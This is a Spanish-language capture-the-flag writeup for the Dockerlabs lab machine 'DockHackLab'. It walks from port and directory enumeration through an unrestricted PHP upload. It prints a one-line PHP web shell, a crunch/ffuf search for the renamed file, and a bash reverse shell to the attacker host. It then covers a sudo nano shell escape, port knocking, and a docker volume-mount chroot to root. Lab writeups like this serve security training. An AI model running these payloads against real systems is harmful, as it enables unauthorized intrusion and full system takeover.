
# Writeup Template: Maquina `[ DockHackLab ]`

- Tags: #DockHackLab #Crunch
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina DockHackLab](https://mega.nz/file/dWVihLRC#h7gh8lDbML0A8YxQlOqthE2yRdjNDeREt6Ho0Ll2si0)

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x dockhacklab.zip
sudo bash auto_deploy.sh dockhacklab.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((UbuntuNoble))
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2/ # No reporta nada critico
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt --add-slash
```

**Hallazgos Relevantes:**
```bash
/hackademy/           (Status: 200) [Size: 1261]
```

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 50 -x php,php.back,backup,txt,sh,html,js,java,py
```

- **Hallazgos**:
```bash
/index.html           (Status: 200) [Size: 10671]
/hackademy            (Status: 301) [Size: 312] [--> http://172.17.0.2/hackademy/]
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora tenemos este servico web que nos permite subir archivos, No especifica que tipo de archivo pero lo que si sabemos es que si no valida el tipo de archivo, Nosotros como atacante podemos colar un archivo malicioso que nos permita realizar una llamada a nivel de sistema para ejecutar comandos en el objetivo
Lo primero que aremos es subir una imagen para ver como es que recciona la web y tambien para ver si indica donde es que se guardan los documentos que subamos.
```bash
http://172.17.0.2/hackademy/upload.php
```

Al subir una imagen nos retorna lo siguiente, Nos indica que nuestro archivo ha sido alterado
```bash
El archivo terminal.png ha sido subido y alterado xxx_tuarchivo , localizalo y actua.
```

Si realizamos fuzzeo de rutas:
```bash
gobuster dir -u http://172.17.0.2/hackademy/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 50 -x php,php.back,backup,txt,sh,html,js,java,py
```

Tenemos lo siguiente:
```bash
/index.html           (Status: 200) [Size: 1261] # Web donde subimos archivos
/upload.php           (Status: 200) [Size: 77] # Valida el tipo de archivo
```

Si revisamos el archivo **uploads** vemos solo los tipos de archivos que podemos subir
```bash
Solo se permiten archivos JPG, JPEG, PNG y ......No se pudo subir el archivo.
```
### Ejecucion del Ataque
Para poder saber donde es que se esta almacenando nuestro archivo, Tendremos que interceptar la peticion para analizar el codigo fuente de la respuesta y poder determinar en donde y como se esta almacenando nuesto archivo.
Ahora lo que aremos es subir una **imagen** e interceptamos despues lo enviamos al modo repeater:
Esta es nuestra peticion de atacante, Omiti el contido de la imagen a unas pocas lineas
```bash
POST /hackademy/upload.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------33289998140184791151448662471
Content-Length: 228135
Origin: http://172.17.0.2
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://172.17.0.2/hackademy/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------33289998140184791151448662471
Content-Disposition: form-data; name="fileToUpload"; filename="terminal1.png"
Content-Type: image/jpeg
```

Revisamos la respuesta del servidor **Response** con el formato **PNG** no tuvimos problemas al subirlo
```bash
HTTP/1.1 200 OK
Date: Fri, 04 Jul 2025 21:27:00 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 86
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

El archivo terminal1.png ha sido subido y alterado xxx_tuarchivo , localizalo y actua.
```

Ahora para abusar de esto crearemos un archivo **php** malicioso y una ves logremos subirlo tendremos que encontralo bajo este patro: **xxx_tuarchivo**
**cmd.php**
```php
<?php
    system($_GET["cmd"]);
?>
```

Ahora intentamos subir el archivo interceptando la peticion con **burpsuite** para ir probando ataque de extensiones en caso de que no permita archivo php
No fue necesario el ataque de extensiones ni nada complicado ya que acepta archivos **php**
```bash
El archivo cmd.php ha sido subido y alterado xxx_tuarchivo , localizalo y actua.
```

Ahora tendremos que usar la siguiente herramienta **cruch**:
Herramienta offline para generar **listas de palabras personalizadas** basadas en:
- Longitud exacta o rangos ( 8-12 caracteres )
- Patrones definidos
- Charsets predefinidos o personalizados
1. **Fuerza bruta** a contraseñas/hashes
2. **Ataques a WiFi** (WPA/WPA2 con aircrack-ng)
3. **Fuzzing de directorios/web** (ej: combinaciones para URLs)
4. **Ingeniería social dirigida** (crear diccionarios con datos del target)

Ahora usaremos este comando:
```bash
crunch 11 11 -t "@@@_cmd.php" -o wordlist.txt
```
#### Explicación:
```bash
11 11: Longitud fija de 11 caracteres
t "@@@_cmd.php":
@@@` = 3 letras minúsculas variables
cmd.php = texto fijo
o wordlist.txt: Guarda en archivo
```

Ahora explotaremos el archivo de la siguiente manera para encontralo
```bash
# Comandos para explotación
ffuf -w wordlist.txt -u "http://172.17.0.2/hackademy/FUZZ"
```

Tenemos un posible resultado positivo:
```bash
klp_cmd.php             [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 0ms]
:: Progress: [17576/17576] :: Job [1/1] :: 58 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

Ahora si intentamos cargarlo en la web:
```bash
http://172.17.0.2/hackademy/klp_cmd.php
```

Ahora lo que procede es ejecutar comandos en el sistema objetivo:
```bash
http://172.17.0.2/hackademy/klp_cmd.php?cmd=whoami
```

Tenemos **RCE** ejecucion remota de comandos en el sistema:
```bash
www-data
```

### Intrusion
Ahora nos aprovechamos de esto para ganar acceso al sistema, Asi que nos ponemos en escucha en nuestra maquina atacante:
```bash
nc -nlvp 443
```

```bash
# Reverse shell o acceso inicial
172.17.0.2/hackademy/klp_cmd.php?cmd=bash -c 'exec bash -i %26>/dev/tcp/172.17.0.1/443 <%261'
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
Enumeracion de usuario
```bash
# Comandos clave ejecutados
cat /etc/passwd | grep "sh"

root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
firsthacking:x:1001:1001:,,,:/home/firsthacking:/bin/bash
```
### Explotacion de Privilegios

###### Usuario `[ www-data ]`:
Listando los permisos de este usario tenemos lo siguiente:
```bash
sudo -l

User www-data may run the following commands on ed44bf952714:
    (firsthacking) NOPASSWD: /usr/bin/nano # Tenemos una via potencial de migrar de usuario
```

Ahora explotamos el privilego para migrar de usuario:
```bash
sudo -u firsthacking /usr/bin/nano
ctrl + R -> ctrl + X
reset; sh 1>&0 2>&0
```

###### Usuario `[ FirstHacking ]`:
Listando los permisos para este usuario:
```bash
sudo -l

User firsthacking may run the following commands on ed44bf952714:
    (ALL) NOPASSWD: /usr/bin/docker # Tenemos una via potencial de migrar a root
```

Listando los permisos de este usuario tenemos el siguiente:
```bash
-rw-rw-r-- 1 firsthacking firsthacking   40 Jul 15  2024 .docker
```

Listamos su contenido:
```bash
cat .docker 
que utiles son las funciones del bashrc
```

Ahora si listamos el contenido de configuracion de la **bashrc** tenemos lo siguiente:
```bash
function docker() {
    echo "�Fijate que hay algo esperando a que llames"
    echo -e "\n 12345 54321 24680 13579 \n"
    echo -e "De nada servira si no llamas antes"
}
```

Si ejecutamos la funcion **docker** nos retorna lo que previamente ya habiamos visto desde el archivo de configuracion:
```bash
docker

�Fijate que hay algo esperando a que llames

 12345 54321 24680 13579 

De nada servira si no llamas antes
```
 
**PortKnocking** Técnica para ocultar servicios expuestos en contenedores
Técnica de seguridad donde un servicio **solo acepta conexiones** después de recibir una secuencia específica de intentos de conexión (knocks) en puertos cerrados.
**Ejemplo**:
1. Cliente toca puerto **1111** → luego **2222** → luego **3333**
2. El servidor abre el puerto **22** (SSH) solo para esa IP
Proteger servicios sensibles (SSH, Paneles de Admin) en contenedores expuestos a internet.
**Dockerfile**:
```dockerfile
FROM ubuntu:latest  
RUN apt-get update && apt-get install -y knockd  
COPY knockd.conf /etc/knockd.conf  
CMD ["knockd", "-d"]  
```

Archivo **knockd.conf**
```bash
[options]  
    logfile = /var/log/knockd.log  

[openSSH]  
    sequence    = 7000,8000,9000  
    seq_timeout = 10  
    command     = /usr/sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT  
    tcpflags    = syn  

[closeSSH]  
    sequence    = 9000,8000,7000  
    command     = /usr/sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT  
```

Sabiendo que la funcion **docker** nos proporciona unos puertos.
Este comando realiza **port knocking** hacia la IP `172.17.0.2` (contenedor Docker) usando una secuencia específica de puertos.
1. **knock**: Herramienta cliente para enviar "knocks"
2. **-v**: Modo verbose (muestra detalles en tiempo real)
3. **172.17.0.2**: IP objetivo (contenedor Docker)
4. **12345 54321 24680 13579**: Secuencia de 4 puertos a "tocar"
5. **-d 1**: Delay de 1 ms entre cada knock (opcional pero útil en redes locales)
```bash
knock -v 172.17.0.2 12345 54321 24680 13579 -d 1
```

Una ves ejecutando obtenemos el siguiente **output**
```bash
hitting tcp 172.17.0.2:12345
hitting tcp 172.17.0.2:54321
hitting tcp 172.17.0.2:24680
hitting tcp 172.17.0.2:13579
```

Ahora que hemos activado el servicio de **docker** podemos explotar el privilegio
```bash
# Comando para escalar al usuario: ( root )
sudo -u root /usr/bin/docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
whoami
root
```
